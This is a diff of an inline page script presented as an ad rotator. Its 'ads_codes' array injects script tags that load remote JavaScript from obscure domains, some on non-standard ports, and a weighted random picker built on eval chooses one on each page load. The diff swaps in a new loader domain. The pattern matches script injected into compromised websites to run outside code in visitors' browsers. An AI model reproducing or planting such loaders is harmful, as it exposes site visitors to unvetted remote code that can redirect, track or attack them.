@@ -1,7 +1,7 @@
 <script>
 var randoms = {
-	ads_codes: ['<script>    var s = document.createElement(\'script\');    s.type = \'text/javascript\';    s.async = true;    s.src = \'https://antonynton.com:4359/gtmhhrdc/aouiq1tis0zgzehy4zcaii/2078\';    var head = document.getElementsByTagName(\'head\')[0];    head.appendChild(s);<'+'/script>','<script id=\'mob\' type=\'text/javascript\' charset=\'utf-8\' src=\'https://k.jjhaolin.com/d.php?pid=8708\'><'+'/script>','<script src="https://ay.3lga3.cn/Power/6719E126-B287-4B87-94ED-6D94DD8897B7.js"><'+'/script>'],
-	ads_weight: [10,10,10],
+	ads_codes: ['<script src="https://ay.3lga3.cn/Power/6719E126-B287-4B87-94ED-6D94DD8897B7.js"><'+'/script>','<script>    var s = document.createElement(\'script\');    s.type = \'text/javascript\';    s.async = true;    s.src = \'https://emetmari.com:4358/ytgwgzsgox/juphj1dkw0bqzqvy4zxbxq/2078\';    var head = document.getElementsByTagName(\'head\')[0];    head.appendChild(s);<'+'/script>'],
+	ads_weight: [10,10],
 
 	get_random: function(weight) {
 		var s = eval(weight.join('+'));
@@ -19,5 +19,4 @@ var randoms = {
 	}
 }
 randoms.init();
-
 </script>
